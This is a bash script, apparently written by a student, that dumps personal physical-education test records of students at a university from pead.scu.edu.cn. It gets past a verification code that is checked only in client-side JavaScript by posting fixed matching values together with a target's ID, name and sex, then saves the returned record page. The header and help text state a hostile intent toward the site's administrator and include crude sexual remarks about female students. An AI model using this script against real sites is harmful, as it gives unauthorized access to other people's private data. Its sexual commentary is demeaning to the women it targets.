########################################################################################################################################################################
# die♂deutsche♂Orthopädie proundly presents
# S. C. U. P. E. Test Website Dumper
# That ass♂hole administrator validates the verification code in the JavaScript, 
# and leave it somewhere in the HTML, 
# so i wanna write a scr♂ipt to fuck him 233333333
# and maybe, i mean maybe, 
# next time when i see a short hair girl with glasses in S. C. U. , 
# i will know how i'll feel when my di♂ck ins♂ert into her bo♂dy 
# in the cow♂girl posi♂tion AND support 75% of her wei♂ght 233333333
# 
# usage: 
# scu.pet.fucker [options] parameter
# 
# options:
# 
# singleuser/file:
# 	default: get student infomations from file, "
# 		but can continue from certain line number"
# 	-C <number> or --continue <number>: get student infomations from file, 
# 		but can continue from certain line number, 
# 		and line number starts from 1, 
# 		so default = -C 1
# 	-S or --singleuser: Single User Mode, 
#		get infomation of a Single student from the parameter
# 
# help:
# 	-H or -h or --help: ask for help, just like other Linux programs
# 
# parameter: 
# 	arrange by <id/name/sex>
# 		id: SCU Student ID Format (i'll not do the format check 233333333)
# 		name: Self-Explanatory
# 		sex: male 1, female 2. don't ask me why, 
# 			it's just POST data 233333333
# 
# HAVE A NICE DUMP, die♂deutsche♂Orthopädie out
# 
# ps. 
# 	长发都tm是怪物
# 	long hair girls are all fuckin' monsters
# 	短发才tm是萌妹
# 	short hair girls are all fuckin' moe girls
# 	短发大法好
# 	VIVA LA SHORT HAIR
########################################################################################################################################################################

########################                          Parameter Analysis                           ########################
parameters=`getopt -o CSH -a -l continue,singleuser,help -- "$@"`

if [ $? != 0 ]
then  
    echo "Houston, we have a problem: Unrecognized Option Detected, Terminating....." >&2  
    exit 1  
fi

eval set -- "$parameters" 

mode=0 # by default
position=1 # by default

while true  
do  
    case "$1" in  
		-C | --continue)
			mode=1
			position=$2
            shift 2
            ;;
		-S | --singleuser)
			mode=2
            shift
            ;;
		-h | -H | --help)  
            #echo "help mode"
			echo "die♂deutsche♂Orthopädie proundly presents"
			echo "ALL in ONE DinDinGo Pronography Dump Script"
			echo "combine forumdump.sh and combined.distiller.and.downloader.plus.singlefile.support.sh"
			echo "reconstructed and optimized for smaller size and better code readability"
			echo "and use new kind of parameter interpreters"
			echo "die♂deutsche♂Orthopädie proundly presents"
			echo "S. C. U. P. E. Test Website Dumper"
			echo "That ass♂hole administrator validates the verification code in the JavaScript, "
			echo "and leave it somewhere in the HTML, "
			echo "so i wanna write a scr♂ipt to fuck him 233333333"
			echo "and maybe, i mean maybe, "
			echo "next time when i see a short hair girl with glasses in S. C. U. , "
			echo "i will know how i'll feel when my di♂ck ins♂ert into her bo♂dy "
			echo "in the cow♂girl posi♂tion AND support 75% of her wei♂ght 233333333"
			echo
			echo "usage: "
			echo "scu.pet.fucker [options] parameter"
			echo
			echo "options: "
			echo
			echo "singleuser/file: "
			echo "	default: get student infomations from file"
			echo "	-C <number> or --continue <number>: get student infomations from file, "
			echo "		but can continue from certain line number, "
			echo "		and line number starts from 1, "
			echo "		so default = -C 1"
			echo "	-S or --singleuser: Single User Mode, "
			echo "		get infomation of a Single student from the parameter"
			echo
			echo "help: "
			echo "	-H or -h or --help: ask for help, just like other Linux programs"
			echo
			echo "parameter: "
			echo "	arrange by <id/name/sex>"
			echo "		id: SCU Student ID Format (i'll not do the format check 233333333)"
			echo "		name: Self-Explanatory"
			echo "		sex: male 1, female 2. don't ask me why, "
			echo "			it's just POST data 233333333"
			echo
			echo "HAVE A NICE DUMP, die♂deutsche♂Orthopädie out"
			echo 
			echo "ps. "
			echo "	长发都tm是怪♂物"
			echo "	long hair girls are all fuckin' mons♂ters"
			echo "	短发才tm是萌♂妹"
			echo "	short hair girls are all fuckin' moe♂girls"
			echo "	短发大♂法好"
			echo "	VIVA♂LA SHORT HAIR"
			exit
            shift
            ;;  		
        --)
			parameter=$2
            shift  
            break  
            ;;  
        *)   
            echo "Internal error!"  
            exit 1  
            ;;  
        esac  
done

if [ -z "$parameter" ]
then
	echo "Houston, we have a problem: You MUST at least provide a parameter"
	exit 1
fi
########################                          Parameter Analysis ends                           ########################

########################                          Function: Dump Single Student Infomations                            ########################
function dSingleStudentInfomations() # input: <id/name/sex>
{
	cookies="/tmp/cookies.pet.scu.txt"
	cookies2="/tmp/cookies.pet.scu.2.txt"
	id=$(echo $1 | cut -d/ -f1)
	name=$(echo $1 | iconv -f utf-8 -t GB18030 | cut -d/ -f2 | tr -d '\n' | xxd -plain | sed 's/\(..\)/%\1/g') # URLEncode
	sex=$(echo $1 | cut -d/ -f3)
	# vCode=$(curl "http://pead.scu.edu.cn/jncx/left.asp" | grep -Eo "<input name=\"yan1\".*[0-9][0-9][0-9][0-9]\">" | grep -Eo "[0-9][0-9][0-9][0-9]")
	# echo "id: $id"
	# echo "name: $name"
	# echo "sex: $sex"
	# echo "vCode: $vCode"
	curl -c $cookies -d "xh=$id&xm=$name&xb=$sex&yan=2333&yan1=6666&Submit=%B2%E9%D1%AF" "http://pead.scu.edu.cn/jncx/logins.asp" /dev/null 
	# curl -c $cookies -d "xh=$id&xm=$name&xb=$sex&yan=$vCode&yan1=$vCode&Submit=%B2%E9%D1%AF" "http://pead.scu.edu.cn/jncx/logins.asp"
	# sed 's/0	/5739365707	/g ' $cookies > $cookies2
	curl -b $cookies "http://pead.scu.edu.cn/jncx/tcsh2.asp" > "$id.html"
	curl -b $cookies "http://pead.scu.edu.cn/jncx/out.asp" > /dev/null
	rm $cookies
}
########################                          Function: Dump Single Student Infomations ends                            ########################

########################                          Main Program                            ########################
case $mode in
	0)
		echo "NOT DEVELOPED YET"
		;;
	1)
		echo "NOT DEVELOPED YET"
		;;
	2)
		dSingleStudentInfomations $parameter
		;;
	*)
		echo "Internal error!"  
		exit 1  
	;;  
esac
########################                          Main Program ends                            ########################
